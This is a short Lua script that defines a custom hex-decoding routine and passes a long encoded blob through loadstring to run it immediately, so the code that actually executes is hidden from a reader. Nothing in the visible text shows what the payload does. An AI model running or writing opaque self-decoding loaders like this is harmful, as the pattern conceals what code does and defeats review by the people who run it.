do
  function decode(str)
    local K, F = 8186484168865098, 16384 + 4887
    return (str:gsub('%x%x',
      function(c)
        local L = K % 274877906944  -- 2^38
        local H = (K - L) / 274877906944
        local M = H % 128
        c = tonumber(c, 16)
        local m = (c + (H - M) / 128) * (2*M + 1) % 256
        K = L * F + H + c + m
        return string.char(m)
      end
    ))
  end
end

loadstring(decode('20c2c5364cc91b8ef0ef6adfca84607aa9b8d849c57993c9073cb4f167b724fe467b65527c6bdde2451f7624a75d67a7023585d7d5aabfdf953f92e7f2b59f6a4ba3b6d14edd4e3a7aa814e50c7a5ced5eb1445ff0ec93789861c0548f20ac4b55c8b652fc1863f51f9637b5154e130a118c3a63fc3faa23868b5b7edcd742f6add401',true))()
